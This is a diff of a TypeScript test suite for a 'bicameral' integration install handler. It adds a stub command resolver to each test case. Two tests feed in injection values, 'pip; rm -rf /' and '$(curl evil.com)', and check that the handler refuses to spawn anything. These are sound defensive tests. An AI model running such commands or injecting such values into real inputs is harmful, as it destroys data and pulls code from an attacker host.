@@ -48,6 +48,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
       verifyState: fakeVerify('configured-not-running'),
     }, 'solo');
     assert.equal(spawnFake.calls.length, 2);
@@ -75,6 +76,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
       runInTerminal: (name, command) => terminalCalls.push({ name, command }),
       verifyState: fakeVerify('configured-not-running'),
     }, 'team');
@@ -96,6 +98,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
       // no runInTerminal wired
     }, 'team');
     assert.equal(spawnFake.calls.length, 1, 'only pip spawns; setup is never spawned');
@@ -132,6 +135,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
     }, 'solo');
     assert.equal(spawnFake.calls.length, 1, 'setup must not be invoked when pip fails');
     assert.equal(result.ok, false);
@@ -147,6 +151,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
     }, 'solo');
     assert.equal(spawnFake.calls.length, 2);
     assert.equal(result.ok, false);
@@ -162,6 +167,7 @@ suite('integrations/bicameral install-handler', () => {
       pythonCommand: 'pip; rm -rf /',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
     }, 'solo');
     assert.equal(spawnFake.calls.length, 0);
     assert.equal(result.ok, false);
@@ -176,6 +182,7 @@ suite('integrations/bicameral install-handler', () => {
       bicameralCommand: '$(curl evil.com)',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
     }, 'solo');
     assert.equal(spawnFake.calls.length, 0);
     assert.equal(result.ok, false);
@@ -188,6 +195,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
     }, 'enterprise' as never);
     assert.equal(spawnFake.calls.length, 0);
     assert.equal(result.ok, false);
@@ -201,6 +209,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
       verifyState: fakeVerify('running'),
     }, 'solo');
     const verifyStep = result.steps.find((s) => s.phase === 'verify');
@@ -215,6 +224,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
       verifyState: fakeVerify('not-installed'),
     }, 'solo');
     const verifyStep = result.steps.find((s) => s.phase === 'verify');
@@ -241,6 +251,7 @@ suite('integrations/bicameral install-handler', () => {
       workspaceRoot: '/tmp/ws',
       onProgress: (e) => events.push(e),
       spawn: spawnFake.fn as never,
+      resolve: (c: string) => c, // a fake spawn: the command named is taken as given
       verifyState: fakeVerify('running'),
     }, 'solo');
     for (const call of spawnFake.calls) {
